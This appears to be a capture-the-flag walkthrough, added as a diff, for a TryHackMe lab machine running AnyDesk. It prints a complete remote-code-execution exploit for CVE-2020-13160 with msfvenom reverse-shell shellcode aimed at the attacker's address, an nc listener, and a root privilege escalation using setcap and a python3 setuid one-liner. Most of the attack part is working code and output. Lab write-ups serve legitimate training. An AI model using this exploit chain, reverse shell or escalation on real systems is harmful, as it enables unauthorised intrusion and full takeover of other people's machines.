@@ -1,0 +1,264 @@
+step1:
+    scan the TARGET_IP using one of the scanning tools(I am using nmap)
+    
+    istiyak@kali:~ nmap -sC -sV -A -Pn 10.10.121.66
+    Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 12:36 +06
+    Nmap scan report for 10.10.121.66
+    Host is up (0.24s latency).
+    Not shown: 998 closed tcp ports (reset)
+    PORT     STATE SERVICE         VERSION
+    22/tcp   open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
+    |   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
+    |_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
+    7070/tcp open  ssl/realserver?
+    | ssl-cert: Subject: commonName=AnyDesk Client
+    | Not valid before: 2022-03-23T20:04:30
+    |_Not valid after:  2072-03-10T20:04:30
+    |_ssl-date: TLS randomness does not represent time
+    Device type: general purpose
+    Running: Linux 4.X
+    OS CPE: cpe:/o:linux:linux_kernel:4.15
+    OS details: Linux 4.15
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 143/tcp)
+    HOP RTT       ADDRESS
+    1   225.21 ms 10.9.0.1
+    2   235.15 ms 10.10.121.66
+
+
+step2:
+    Observe Nmap's enumeration. Port 7070 reveals something interesting.
+    ssl-cert: Subject: commonName=AnyDesk Client
+    | Not valid before: 2022-03-23T20:04:30
+    |_Not valid after:  2072-03-10T20:04:30
+
+step3:
+    Now, run this command in the terminal:
+    istiyak@kali:~ searchsploit AnyDesk                 
+    ------------------------------------------------------------ ---------------------------------
+    Exploit Title                                               |  Path
+    ------------------------------------------------------------ ---------------------------------
+    AnyDesk 2.5.0 - Unquoted Service Path Privilege Escalation  | windows/local/40410.txt
+    AnyDesk 5.4.0 - Unquoted Service Path                       | windows/local/47883.txt
+    AnyDesk 5.5.2 - Remote Code Execution                       | linux/remote/49613.py
+    AnyDesk 7.0.15 - Unquoted Service Path                      | windows/local/51968.txt
+
+    istiyak@kali:~ searchsploit -m linux/remote/49613.py
+        Exploit: AnyDesk 5.5.2 - Remote Code Execution
+        URL: https://www.exploit-db.com/exploits/49613
+        Path: /usr/share/exploitdb/exploits/linux/remote/49613.py
+        Codes: CVE-2020-13160
+        Verified: True
+        File Type: Python script, ASCII text executable
+        Copied to: /home/istiyak/49613.py
+
+    istiyak@kali:~ mv 49613.py anydesk_rce.py
+
+step4:
+    istiyak@kali:~ cat anydesk_rce.py
+
+    #!/usr/bin/env python
+    import struct
+    import socket
+    import sys
+
+    ip = 'MACHINE_IP'
+    port = 50001
+
+    def gen_discover_packet(ad_id, os, hn, user, inf, func):
+    d  = chr(0x3e)+chr(0xd1)+chr(0x1)
+    d += struct.pack('>I', ad_id)
+    d += struct.pack('>I', 0)
+    d += chr(0x2)+chr(os)
+    d += struct.pack('>I', len(hn)) + hn
+    d += struct.pack('>I', len(user)) + user
+    d += struct.pack('>I', 0)
+    d += struct.pack('>I', len(inf)) + inf
+    d += chr(0)
+    d += struct.pack('>I', len(func)) + func
+    d += chr(0x2)+chr(0xc3)+chr(0x51)
+    return d
+
+    # msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
+    shellcode =  b""
+    shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
+    shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xcb\x46\x40"
+    shellcode += b"\x6c\xed\xa4\xe0\xfb\x48\x31\x58\x27\x48\x2d"
+    shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xa1\x6f\x18\xf5\x87"
+    shellcode += b"\xa6\xbf\x91\xca\x18\x4f\x69\xa5\x33\xa8\x42"
+    shellcode += b"\xc9\x46\x41\xd1\x2d\x0c\x96\xf8\x9a\x0e\xc9"
+    shellcode += b"\x8a\x87\xb4\xba\x91\xe1\x1e\x4f\x69\x87\xa7"
+    shellcode += b"\xbe\xb3\x34\x88\x2a\x4d\xb5\xab\xe5\x8e\x3d"
+    shellcode += b"\x2c\x7b\x34\x74\xec\x5b\xd4\xa9\x2f\x2e\x43"
+    shellcode += b"\x9e\xcc\xe0\xa8\x83\xcf\xa7\x3e\xba\xec\x69"
+    shellcode += b"\x1d\xc4\x43\x40\x6c\xed\xa4\xe0\xfb"
+
+    print('sending payload ...')
+    p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.sendto(p, (ip, port))
+    s.close()
+    print('reverse shell should connect within 5 seconds')
+
+
+step5:
+    Now run this command:
+    istiyak@kali:~ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
+    to find LHOST, type ifconfig in the terminal.
+    istiyak@kali:~ ifconfig
+    docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:14:76:7e:45  txqueuelen 0  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 5 overruns 0  carrier 0  collisions 0
+
+    lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+            inet 127.0.0.1  netmask 255.0.0.0
+            inet6 ::1  prefixlen 128  scopeid 0x10<host>
+            loop  txqueuelen 1000  (Local Loopback)
+            RX packets 88  bytes 6960 (6.7 KiB)
+            RX errors 0  dropped 0  overruns 0  frame 0
+            TX packets 88  bytes 6960 (6.7 KiB)
+            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+    tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+            inet 10.9.0.75  netmask 255.255.0.0  destination 10.9.0.75
+            inet6 fe80::aa32:6c60:317d:7983  prefixlen 64  scopeid 0x20<link>
+            unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
+            RX packets 2495  bytes 129047 (126.0 KiB)
+            RX errors 0  dropped 0  overruns 0  frame 0
+            TX packets 2870  bytes 151007 (147.4 KiB)
+            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+    wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+            inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
+            inet6 fe80::fc78:4375:6dc9:7caf  prefixlen 64  scopeid 0x20<link>
+            ether f4:a4:75:db:ec:91  txqueuelen 1000  (Ethernet)
+            RX packets 150366  bytes 184424122 (175.8 MiB)
+            RX errors 0  dropped 0  overruns 0  frame 0
+            TX packets 92973  bytes 18497810 (17.6 MiB)
+            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+    ****tun0 inet address is the LHOST.***
+
+
+    istiyak@kali:~ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.9.0.75 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
+    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+    [-] No arch selected, selecting arch: x64 from the payload
+    Found 3 compatible encoders
+    Attempting to encode payload with 1 iterations of x64/xor
+    x64/xor succeeded with size 119 (iteration=0)
+    x64/xor chosen with final size 119
+    Payload size: 119 bytes
+    Final size of python file: 680 bytes
+    shellcode =  b""
+    shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
+    shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xd8\x70\x20"
+    shellcode += b"\x17\x21\xa8\x3a\x0c\x48\x31\x58\x27\x48\x2d"
+    shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xb2\x59\x78\x8e\x4b"
+    shellcode += b"\xaa\x65\x66\xd9\x2e\x2f\x12\x69\x3f\x72\xb5"
+    shellcode += b"\xda\x70\x31\x4b\x2b\xa1\x3a\x47\x89\x38\xa9"
+    shellcode += b"\xf1\x4b\xb8\x60\x66\xf2\x28\x2f\x12\x4b\xab"
+    shellcode += b"\x64\x44\x27\xbe\x4a\x36\x79\xa7\x3f\x79\x2e"
+    shellcode += b"\x1a\x1b\x4f\xb8\xe0\x81\x23\xba\x19\x4e\x38"
+    shellcode += b"\x52\xc0\x3a\x5f\x90\xf9\xc7\x45\x76\xe0\xb3"
+    shellcode += b"\xea\xd7\x75\x20\x17\x21\xa8\x3a\x0c"
+
+
+step6:
+    now replace the below portion in the anydesk_rce.py
+    shellcode =  b""
+    shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
+    shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xd8\x70\x20"
+    shellcode += b"\x17\x21\xa8\x3a\x0c\x48\x31\x58\x27\x48\x2d"
+    shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xb2\x59\x78\x8e\x4b"
+    shellcode += b"\xaa\x65\x66\xd9\x2e\x2f\x12\x69\x3f\x72\xb5"
+    shellcode += b"\xda\x70\x31\x4b\x2b\xa1\x3a\x47\x89\x38\xa9"
+    shellcode += b"\xf1\x4b\xb8\x60\x66\xf2\x28\x2f\x12\x4b\xab"
+    shellcode += b"\x64\x44\x27\xbe\x4a\x36\x79\xa7\x3f\x79\x2e"
+    shellcode += b"\x1a\x1b\x4f\xb8\xe0\x81\x23\xba\x19\x4e\x38"
+    shellcode += b"\x52\xc0\x3a\x5f\x90\xf9\xc7\x45\x76\xe0\xb3"
+    shellcode += b"\xea\xd7\x75\x20\x17\x21\xa8\x3a\x0c"
+
+    (this might be different in your case. So try it yourself.)
+
+
+step7:
+    now run the below two command in different terminal to get reverse shell.
+    istiyak@kali:~ nc -lvnp 4444
+    istiyak@kali:~ python2 anydesk_rce.py
+
+    Boom!! Here we got the shell.
+    annie@desktop:/home/annie$ whoami
+    annie
+    annie@desktop:/home/annie$ ls 
+    Desktop Documents Downloads Music Pictures
+    Public Templates Videos user.txt
+
+    annie@desktop:/home/annie$ cat user.txt
+    THM{N0t_Ju5t_***_****}
+    Here we got the user flag.
+
+step7:
+    annie@desktop:/home/annie$ find / -perm /4000 2>/dev/null
+    /sbin/setcap
+    /bin/mount
+    /bin/ping
+    /bin/su
+    /bin/fusermount
+    /bin/umount
+    /usr/sbin/pppd
+    /usr/lib/eject/dmcrypt-get-device
+    /usr/lib/openssh/ssh-keysign
+    /usr/lib/policykit-1/polkit-agent-helper-1
+    /usr/lib/xorg/Xorg.wrap
+    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    /usr/bin/arping
+    /usr/bin/newgrp
+    /usr/bin/sudo
+    /usr/bin/traceroute6.iputils
+    /usr/bin/chfn
+    /usr/bin/gpasswd
+    /usr/bin/chsh
+    /usr/bin/passwd
+    /usr/bin/pkexec
+
+    let's check out on /sbin/setcap
+
+step8:
+    annie@desktop:/home/annie$ cp /usr/bin/python3 .
+    annie@desktop:/home/annie$ /sbin/setcap cap_setuid+ep /home/annie/python3
+    nnie@desktop:/home/annie$ ./python3 -c "import os;os.setuid(0);os.system('/bin/bash')"
+    < -c "import os;os.setuid(0);os.system('/bin/bash')"
+    whoami
+    root
+    bash -i
+    root@desktop:/home/annie# pwd
+    /home/annie
+    root@desktop:/home/annie# cd ~
+    root@desktop:/root# 
+    root@desktop:/root# pwd
+    /root
+    root@desktop:/root# ls
+    root.txt THM-Voucher.txt
+    root@desktop:/root# cat root.txt
+    THM{0nly_th3m_*****_****}
+
+    Hurrah! we find the root flag.
+
+
+
+<!----------Author's message: Give it a try yourself. Happy hacking!----------->
+
+
+
+
+
+
+
